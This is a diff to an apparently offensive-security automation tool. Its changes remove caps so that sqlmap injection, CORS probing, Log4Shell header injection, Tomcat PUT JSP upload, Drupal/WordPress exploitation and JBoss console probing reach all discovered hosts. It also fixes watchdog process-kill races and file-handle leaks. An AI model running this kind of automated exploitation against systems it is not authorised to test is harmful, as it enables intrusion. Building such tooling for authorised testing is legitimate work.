@@ -203,6 +203,16 @@ WATCHDOG_MAX_IDLE  = 5
 WATCHDOG_DIAG_AT   = 3
 WATCHDOG_MSF_IDLE  = 10
 
+# Per-call sqlmap timeouts already bound total runtime, so these caps exist only
+# to keep a single phase from ballooning. When a cap actually drops candidates we
+# emit a degradation marker so the report reflects partial coverage rather than
+# silently over-reporting. (audit-fix findings 1/2)
+SQLMAP_GET_MAX     = 20    # top GET candidates (db-named hosts prepended first)
+# POST: 0 = iterate ALL discovered endpoints (per-call timeout bounds runtime).
+SQLMAP_POST_MAX    = 0
+# CORS: 0 = test ALL live URLs (env override CORS_MAX_URLS). (audit-fix finding 6)
+CORS_MAX_URLS      = int(os.environ.get("CORS_MAX_URLS", "0") or "0")
+
 # Colours
 GREEN   = "\033[0;32m"
 RED     = "\033[0;31m"
@@ -342,6 +352,16 @@ class ProcessWatchdog:
         effective_path: str = "",
     ):
         self.proc        = proc
+        # audit-fix (finding 4): pin the child's process-group id at construction.
+        # Children are launched via setsid (run_cmd / _fork_safe_spawn), so the
+        # child pid == its pgid. Pinning it now means _kill_proc never re-derives
+        # the pgid from a pid that a concurrent reap may have recycled to an
+        # unrelated process — closing the PID-reuse TOCTOU that could killpg a
+        # bystander group. Falls back to proc.pid (its own pgid under setsid).
+        try:
+            self._orig_pgid = os.getpgid(proc.pid)
+        except Exception:
+            self._orig_pgid = proc.pid
         self.watch_file  = watch_file
         self.phase       = phase
         self.interval    = interval
@@ -607,10 +627,21 @@ class ProcessWatchdog:
         return busy, proc_changed, summary, cpu_advanced, socket_active, socket_changed, socket_summary
 
     def _kill_proc(self) -> None:
-        """Kill the entire process group so all shell children die too."""
+        """Kill the entire process group so all shell children die too.
+
+        audit-fix (finding 4): poll() FIRST. ``Popen.poll()`` is authoritative
+        and reaps the child under its own lock; once it returns non-None the pid
+        (and its setsid pgid) may be recycled by the OS, so deriving/killing a
+        pgid afterwards races a bystander. If the process already exited we mark
+        killed and return without signalling anything. Otherwise we killpg the
+        pgid PINNED at construction (never re-derived from a possibly-recycled
+        pid).
+        """
+        if self.proc.poll() is not None:
+            self.killed = True
+            return
         try:
-            pgid = os.getpgid(self.proc.pid)
-            os.killpg(pgid, signal.SIGKILL)
+            os.killpg(self._orig_pgid, signal.SIGKILL)
         except Exception:
             try:
                 self.proc.kill()
@@ -727,6 +758,12 @@ class ProcessWatchdog:
                                 break
                         
                         if assessment == "stuck":
+                            # audit-fix (finding 4): the brain diagnose call above can
+                            # block for minutes; re-check liveness/stop before killing so
+                            # we don't SIGKILL a process that finished (and whose pgid the
+                            # OS may have recycled) during that window.
+                            if self._stop_evt.is_set() or self.proc.poll() is not None:
+                                break
                             print(
                                 f"\033[0;31m\033[1m[Watchdog/{self.phase}] Brain assessment: STUCK or MISCONFIGURED. "
                                 f"Triggering early SIGKILL to prevent resource exhaustion...\033[0m",
@@ -752,6 +789,12 @@ class ProcessWatchdog:
                     )
 
             if stale_count >= self.max_stale:
+                # audit-fix (finding 4): re-check liveness/stop just before killing.
+                # The brain diagnose/kill notification below may block; if the
+                # process exited or stop was signalled in the meantime, bail out
+                # without killpg-ing a possibly-recycled pgid.
+                if self._stop_evt.is_set() or self.proc.poll() is not None:
+                    break
                 stale_secs = stale_count * self.interval
                 print(
                     f"\033[0;31m\033[1m[Watchdog/{self.phase}] STUCK "
@@ -3461,7 +3504,7 @@ def run_autonomous_hunt(
     skip_items: set[str] | None = None,
     time_left_hours: float = 2.0,
     scope_lock: bool = False,
-    max_urls: int = 100,
+    max_urls: int = 0,
 ) -> dict:
     skip_items = skip_items or set()
     if resume:
@@ -3790,7 +3833,7 @@ def run_recon(
     resume: bool = False,
     session_id: str | None = None,
     scope_lock: bool = False,
-    max_urls: int = 100,
+    max_urls: int = 0,
     targets_file: str | None = None,
 ) -> bool:
     if resume:
@@ -4290,7 +4333,7 @@ def run_js_analysis(domain: str) -> bool:
             # Record a url->file manifest alongside the content-hash-named downloads so a
             # finding (e.g. a verified key in a bundle) can carry its exact public URL without
             # a live re-fetch. (Filename is md5(url+"\n").js — the trailing newline is echo's.)
-            f'cat "{js_urls_file}" | head -50 | while IFS= read -r url; do '
+            f'cat "{js_urls_file}" | while IFS= read -r url; do '
             f'  name=$(echo "$url" | md5sum | cut -d" " -f1).js; '
             f'  curl -sk --connect-timeout 5 --max-time 20 "$url" -o "{dl_dir}/$name" 2>/dev/null; '
             f'  printf "%s\\t%s\\n" "$name" "$url" >> "{dl_dir}/manifest.tsv"; '
@@ -4299,6 +4342,19 @@ def run_js_analysis(domain: str) -> bool:
             watch_file=dl_dir,
             watch_phase="JS ANALYSIS"
         )
+        # audit-fix (finding 3): the old ``head -50`` capped trufflehog to the
+        # first 50 JS bundles in file order — silently skipping the rest of the
+        # attack surface. The per-curl ``--max-time 20`` + run_cmd ``timeout=300``
+        # already bound runtime, so the cap is gone. If the loop was nonetheless
+        # cut short by the wall-clock timeout, surface partial coverage rather
+        # than over-reporting.
+        try:
+            _downloaded = sum(1 for n in os.listdir(dl_dir) if n.endswith(".js"))
+        except OSError:
+            _downloaded = 0
+        if js_count and _downloaded < js_count:
+            _mark_degraded("trufflehog",
+                           f"JS download bounded by timeout: scanned {_downloaded} of {js_count} bundles")
         ok, output = run_cmd(
             f'{trufflehog} filesystem "{dl_dir}" --json --no-update 2>/dev/null | tee "{tf_out}"',
             timeout=SECRET_TIMEOUT,
@@ -4669,9 +4725,15 @@ def run_cors_check(domain: str) -> bool:
 
     cors_out = os.path.join(cors_dir, "cors_findings.txt")
     # Test each live URL for CORS misconfig
+    # audit-fix (finding 6): the old ``[:100]`` slice silently dropped every live
+    # URL past the first 100 with no coverage marker. CORS_MAX_URLS (env
+    # CORS_MAX_URLS, default 0 = unlimited) replaces it; when a positive cap drops
+    # URLs we record a degradation below so the report shows partial coverage.
     cors_script = f"""
 import subprocess, sys, urllib.request
-urls = open("{live_file}").read().splitlines()[:100]
+_all_urls = open("{live_file}").read().splitlines()
+_cap = {CORS_MAX_URLS}
+urls = _all_urls[:_cap] if _cap > 0 else _all_urls
 findings = []
 target_domain = "{domain}"
 origins = [
@@ -4742,10 +4804,20 @@ print(f"[CORS] {{len(findings)}} findings saved to {cors_out}")
             log("info", f"CORS: {info_count} wildcard (no-creds) endpoint(s) [informational] → {cors_out}")
         else:
             log("ok", "CORS: No misconfigurations found")
+    # audit-fix (finding 6): if a positive CORS_MAX_URLS capped the surface,
+    # surface the skipped count rather than passing the phase silently.
+    try:
+        _cors_total = sum(1 for _l in open(live_file) if _l.strip())
+    except OSError:
+        _cors_total = 0
+    _cors_skipped = 0
+    if CORS_MAX_URLS > 0 and _cors_total > CORS_MAX_URLS:
+        _cors_skipped = _cors_total - CORS_MAX_URLS
+        _mark_degraded("cors", f"URL surface capped: tested {CORS_MAX_URLS} of {_cors_total}")
     _brain_phase_complete(
         "CORS CHECK",
         ok,
-        detail=f"target={domain}",
+        detail=f"target={domain} live_urls={_cors_total} cors_skipped={_cors_skipped}",
         artifacts={"cors": cors_dir},
     )
     return True
@@ -5141,6 +5213,13 @@ def run_cms_exploit(domain: str) -> bool:
 
     if drupal_hosts:
         log("crit", f"Drupal detected on {len(drupal_hosts)} host(s): {drupal_hosts}")
+        # audit-fix (finding 7): the nuclei/drupalgeddon2 loops below cap at the
+        # first 5 hosts. Surface the true total + a degradation so coverage isn't
+        # silently under-reported when more than 5 Drupal hosts are in scope.
+        if len(drupal_hosts) > 5:
+            log("warn", f"Drupal exploit caps: testing first 5 of {len(drupal_hosts)} host(s) "
+                        f"({len(drupal_hosts) - 5} not exploited)")
+            _mark_degraded("drupal", f"CMS exploit capped: tested 5 of {len(drupal_hosts)} hosts")
 
         # ── Step 3a: nuclei Drupal templates (replaces droopescan; works on Python 3.14) ──
         nuclei_bin = _tool_bin("nuclei")
@@ -5297,6 +5376,13 @@ check
     #     or `routes` key), OR
     #   • whatweb fingerprint already in the per-host tech_matches AND a 200
     #     on a wp-* path.
+    # audit-fix (finding 7): the ``[:5]`` cap dropped WordPress candidate hosts
+    # before they were even body-confirmed — log the true total and mark the
+    # dropped hosts so coverage isn't silently under-reported.
+    if len(wp_hosts) > 5:
+        log("warn", f"WordPress fingerprint on {len(wp_hosts)} host(s) — confirming first 5 "
+                    f"({len(wp_hosts) - 5} not probed)")
+        _mark_degraded("wordpress", f"confirm capped: probed 5 of {len(wp_hosts)} fingerprinted hosts")
     confirmed_wp_hosts = []
     for host in wp_hosts[:5]:
         confirmed = False
@@ -5327,7 +5413,10 @@ check
 
     if wp_hosts:
         log("crit", f"WordPress confirmed on {len(wp_hosts)} host(s)")
-        for host in wp_hosts[:5]:
+        # audit-fix (finding 7): iterate ALL confirmed hosts (the confirmation
+        # stage above already bounds this list) — the redundant ``[:5]`` here was
+        # a second silent cap that would bite if the confirm cap is ever raised.
+        for host in wp_hosts:
             safe = host.replace("://", "_").replace("/", "_").replace(":", "_")
             wp_out = os.path.join(exploit_dir, f"wordpress_{safe}.txt")
             results = [f"# WordPress recon — {host}\n"]
@@ -5476,10 +5565,15 @@ def run_rce_scan(domain: str) -> bool:
     nuclei_rce_out = os.path.join(rce_dir, "nuclei_rce.txt")
     if _which(nuclei_bin):
         targets_file = os.path.join(rce_dir, "java_targets.txt")
+        # audit-fix (finding 8): write ALL java targets to the nuclei input file.
+        # nuclei's own concurrency + run_cmd timeout bound runtime, so the old
+        # ``[:30]`` only dropped hosts from the file while the log claimed the
+        # capped count — under-scanning while over-reporting. Now the file and
+        # the log both reflect the true total.
         with open(targets_file, "w") as f:
-            f.write("\n".join(java_targets[:30]) + "\n")
+            f.write("\n".join(java_targets) + "\n")
 
-        log("info", f"nuclei: CVE templates (tomcat, jboss, log4shell, rce) on {len(java_targets[:30])} hosts")
+        log("info", f"nuclei: CVE templates (tomcat, jboss, log4shell, rce) on {len(java_targets)} hosts")
         ok, out = run_cmd(
             f'{nuclei_bin} -l "{targets_file}" '
             f'-tags tomcat,jboss,log4shell,rce,cve '
@@ -5597,7 +5691,12 @@ def run_rce_scan(domain: str) -> bool:
     log4shell_out = os.path.join(rce_dir, "log4shell.txt")
     log4s_results = [f"# Log4Shell (CVE-2021-44228) — {domain}\n# OOB: {oob_url}\n"]
 
-    for target_url in java_targets[:20]:
+    # audit-fix (finding 8): Log4Shell runs on the Java-confirmed host set, a
+    # bounded list; iterate ALL of it (each curl is ``-m 5`` bounded) instead of
+    # silently dropping hosts past the first 20 on this confirmed-tech path.
+    if len(java_targets) > 20:
+        log("info", f"Log4Shell: probing all {len(java_targets)} Java-confirmed host(s)")
+    for target_url in java_targets:
         for payload in log4shell_variants[:2]:  # 2 variants per host to limit noise
             # Inject in User-Agent, X-Forwarded-For, Referer
             headers = [
@@ -5663,8 +5762,13 @@ def run_rce_scan(domain: str) -> bool:
     tomcat_rce_out = os.path.join(rce_dir, "tomcat_put_rce.txt")
     tomcat_results = [f"# CVE-2017-12615 Tomcat PUT RCE — {domain}\n"]
 
-    # Detect Tomcat targets: any Java target running Tomcat based on Server header or tech tag
+    # Detect Tomcat targets: any Java target running Tomcat based on Server header or tech tag.
+    # audit-fix (finding 8): when Tomcat is CONFIRMED (tomcat_targets), test the
+    # whole confirmed set; only the unconfirmed java fallback keeps a heuristic
+    # ``[:10]`` bound. The downstream loop iterates put_targets in full.
     put_targets = tomcat_targets if tomcat_targets else java_targets[:10]
+    if len(put_targets) > 10:
+        log("info", f"Tomcat PUT RCE: probing {len(put_targets)} confirmed Tomcat host(s)")
 
     jsp_content = """<%@ page import="java.io.*" %>
 <%
@@ -5687,7 +5791,7 @@ catch (Exception e) {
     with open(jsp_payload_path, "w") as jsp_file:
         jsp_file.write(jsp_content)
 
-    for target_url in put_targets[:10]:
+    for target_url in put_targets:
         # Test 1: OPTIONS to see allowed methods
         _, out = run_cmd_args(
             ["curl", "-sk", "-m", "5", "-X", "OPTIONS", "-D-", "-o", "/dev/null", f"{target_url}/"],
@@ -5769,8 +5873,15 @@ exploit
     jboss_results   = [f"# JBoss Admin Console Exposure — {domain}\n"]
 
     # Probe all Java targets (not just detected JBoss — many show JBoss default page
-    # without flagging the tech header)
-    jboss_probe_targets = list(dict.fromkeys(jboss_targets if jboss_targets else java_targets[:10]))[:20]
+    # without flagging the tech header).
+    # audit-fix (finding 8): when JBoss is CONFIRMED (jboss_targets), probe the
+    # full confirmed set; only the unconfirmed java fallback keeps the heuristic
+    # ``[:10]`` bound. The old extra ``[:20]`` cap (here and in the loop) silently
+    # dropped confirmed JBoss hosts — mark a degradation if it would have bitten.
+    if jboss_targets:
+        jboss_probe_targets = list(dict.fromkeys(jboss_targets))
+    else:
+        jboss_probe_targets = list(dict.fromkeys(java_targets[:10]))
 
     jboss_paths = [
         "/jmx-console/",
@@ -5794,7 +5905,7 @@ exploit
         "web application firewall",
     )
 
-    for target_url in jboss_probe_targets[:20]:
+    for target_url in jboss_probe_targets:
         for path in jboss_paths:
             _, out = run_cmd_args(
                 ["curl", "-sk", "-m", "5", "-w", "\n%{http_code}", f"{target_url.rstrip('/')}{path}"],
@@ -6122,7 +6233,14 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
     # v9.24 — seed db-named in-scope live hosts (mssql/mysql/db/postgres/oracle…)
     # as sqlmap candidates. These are the highest-value SQLi surface yet the
     # historical aggregator never included them (no query string → filtered out).
-    candidates.extend(_collect_db_named_candidates(recon_dir))
+    #
+    # audit-fix (finding 1/9): PREPEND db-named candidates so they survive the
+    # ``[:SQLMAP_GET_MAX]`` cap below. Appending them put db-tier hosts last in
+    # insertion order, so on busy targets they were the FIRST to be dropped —
+    # exactly inverting their priority. Seed up to the GET cap (was 10) so a
+    # large db tier isn't bottlenecked at the seed stage either (finding 9).
+    db_named = _collect_db_named_candidates(recon_dir, limit=SQLMAP_GET_MAX)
+    candidates = db_named + candidates
 
     candidates = [c for c in dict.fromkeys(candidates) if not _looks_like_payload_url(c)]
 
@@ -6131,7 +6249,18 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
     # tokens (``?d=FUZZ&t=FUZZ`` → ``?d=1&t=1``) so sqlmap has a real baseline
     # value to mutate instead of fuzzing the literal string "FUZZ".
     candidates = _sanitize_sqlmap_candidates(candidates)
-    candidates = candidates[:20]  # top 20 GET candidates
+
+    # audit-fix (finding 1): cap the GET surface, but mark a degradation if the
+    # cap actually dropped anything — silently testing only the first N hosts
+    # over-reports coverage. db-named hosts are already at the front, so the
+    # drops are the lower-value tail.
+    _total_get = len(candidates)
+    candidates = candidates[:SQLMAP_GET_MAX]  # top GET candidates
+    if _total_get > SQLMAP_GET_MAX:
+        _dropped = _total_get - SQLMAP_GET_MAX
+        log("warn", f"sqlmap GET candidates capped at {SQLMAP_GET_MAX} "
+                    f"({_dropped} of {_total_get} dropped, db-named retained)")
+        _mark_degraded("sqlmap", f"GET candidates capped: tested {SQLMAP_GET_MAX} of {_total_get}")
 
     # v9.24 audit-fix (finding L): remember whether ANY candidate was discovered
     # before reachability filtering, so the "nothing to test" message can tell
@@ -6269,8 +6398,11 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
 
     injections = 0
     if os.path.exists(sqli_out):
-        injections = sum(1 for line in open(sqli_out)
-                         if "injectable" in line.lower() or "injection" in line.lower())
+        # audit-fix (finding 10): use a context manager so the fd is closed
+        # promptly rather than leaked until GC.
+        with open(sqli_out) as _sf:
+            injections = sum(1 for line in _sf
+                             if "injectable" in line.lower() or "injection" in line.lower())
         if injections:
             log("crit", f"sqlmap: {injections} injectable parameter(s) found → {sqli_dir}")
             injectable_found = True
@@ -6479,12 +6611,22 @@ def _parse_sqlmap_sql_query_rows(out: str) -> list[str]:
     if not out:
         return []
     rows = []
-    skip = ("starting @ ", "ending @ ", "shutting down at ")
+    # sqlmap banner lines always carry a wall-clock time, e.g.
+    #   ``[*] starting @ 14:03:22 /2026-06-20/``
+    #   ``[*] shutting down at 14:05:01``
+    # audit-fix (finding 10): anchor the banner skip to that trailing HH:MM[:SS]
+    # so a legitimately-retrieved value that merely begins with one of these
+    # words (e.g. ``shutting down at user request``) is NOT mistaken for a banner
+    # and dropped.
+    _banner_re = re.compile(
+        r'^(?:starting @|ending @|shutting down at)\s.*\b\d{1,2}:\d{2}(?::\d{2})?\b',
+        re.IGNORECASE,
+    )
     for ln in out.splitlines():
         s = ln.strip()
         if s.startswith("[*] "):
             val = s[4:].strip()
-            if val and not val.lower().startswith(skip):
+            if val and not _banner_re.match(val):
                 rows.append(val)
     return rows
 
@@ -6734,9 +6876,11 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
     conf = _parse_sqlmap_confirmation(out)
     # results.txt CSV is an extra signal on a fresh (non-resumed) run.
     if os.path.isfile(sqli_out):
-        for ln in open(sqli_out):
-            if "injectable" in ln.lower() or "injection point" in ln.lower():
-                conf["confirmed"] = True
+        # audit-fix (finding 10): context-managed read (was a leaked fd).
+        with open(sqli_out) as _sf:
+            for ln in _sf:
+                if "injectable" in ln.lower() or "injection point" in ln.lower():
+                    conf["confirmed"] = True
 
     target_url = path_from_file if path_from_file.lower().startswith("http") \
         else f"https://{effective_domain}{path_from_file}"
@@ -7052,14 +7196,31 @@ def run_post_param_discovery(domain: str,
         log("info", f"  POST {url}  params=[{params_preview}]")
 
     # ── Step 3: sqlmap --data on POST candidates ──────────────────────────────
+    post_tested = 0
+    post_skipped = 0
     if _which("sqlmap") and post_params:
         findings_dir  = _resolve_findings_dir(domain, create=True)
         sqli_post_dir = os.path.join(findings_dir, "sqlmap_post")
         os.makedirs(sqli_post_dir, exist_ok=True)
         cookie_opt = f'--cookie="{cookies}"' if cookies else ""
 
+        # audit-fix (finding 2): iterate ALL discovered POST endpoints. The
+        # per-call ``--timeout=10`` + run_cmd timeout already bound total runtime,
+        # so the old ``[:10]`` insertion-order cap only served to silently drop
+        # endpoints (and over-report coverage). SQLMAP_POST_MAX==0 means no cap;
+        # if a positive cap is ever reintroduced, the skipped count is surfaced
+        # in _brain_phase_complete below.
+        post_items = list(post_params.items())
+        if SQLMAP_POST_MAX and len(post_items) > SQLMAP_POST_MAX:
+            post_skipped = len(post_items) - SQLMAP_POST_MAX
+            post_items = post_items[:SQLMAP_POST_MAX]
+            log("warn", f"sqlmap POST endpoints capped at {SQLMAP_POST_MAX} "
+                        f"({post_skipped} skipped)")
+            _mark_degraded("sqlmap", f"POST endpoints capped: tested {SQLMAP_POST_MAX} of {len(post_params)}")
+        post_tested = len(post_items)
+
         injectable_count = 0
-        for url, info in list(post_params.items())[:10]:  # top 10 endpoints
+        for url, info in post_items:
             params_str = "&".join(f"{p}=1" for p in info["params"][:8])
             safe_name  = (url.replace("https://", "").replace("http://", "")
                              .replace("/", "_").replace(":", "_"))[:60]
@@ -7090,7 +7251,8 @@ def run_post_param_discovery(domain: str,
         True,
         detail=(f"target={domain} engine={engine_label} "
                 f"forms={total_forms} post_endpoints={len(post_params)} "
-                f"post_urls={len(post_urls)}"),
+                f"post_urls={len(post_urls)} "
+                f"sqlmap_tested={post_tested} sqlmap_skipped={post_skipped}"),
         artifacts={"post_params": post_params_file, "lp_forms": lp_forms_file},
     )
     return True
@@ -7496,7 +7658,7 @@ def hunt_target(
     full: bool = False,
     skip_scan: bool = False,
     scope_lock: bool = False,
-    max_urls: int = 100,
+    max_urls: int = 0,
     targets_file: str | None = None,
     browser_scan: bool = False,
     browser_headed: bool = False,
@@ -8053,8 +8215,8 @@ Examples:
                         help="Allow browser tasks that may submit forms or try default credentials")
     parser.add_argument("--scope-lock",       action="store_true",
                         help="Scope-lock: skip subdomain enumeration entirely — test only the exact --target given (no assetfinder/subfinder/amass/crt.sh)")
-    parser.add_argument("--max-urls",         type=int, default=100, metavar="N",
-                        help="Cap total URLs collected during recon to N (default: 100, priority-ordered: params > JS > API > rest). Use 0 for unlimited.")
+    parser.add_argument("--max-urls",         type=int, default=0, metavar="N",
+                        help="Cap total URLs collected during recon to N (default: 0 = unlimited; priority-ordered: params > JS > API > rest).")
     parser.add_argument("--skip",             action="append", default=[],
                         help="Skip phases/checks. Repeat or comma-separate values, e.g. --skip xss,sqli or --skip api --skip rce")
     parser.add_argument("--semgrep",          type=str, metavar="SOURCE_DIR",
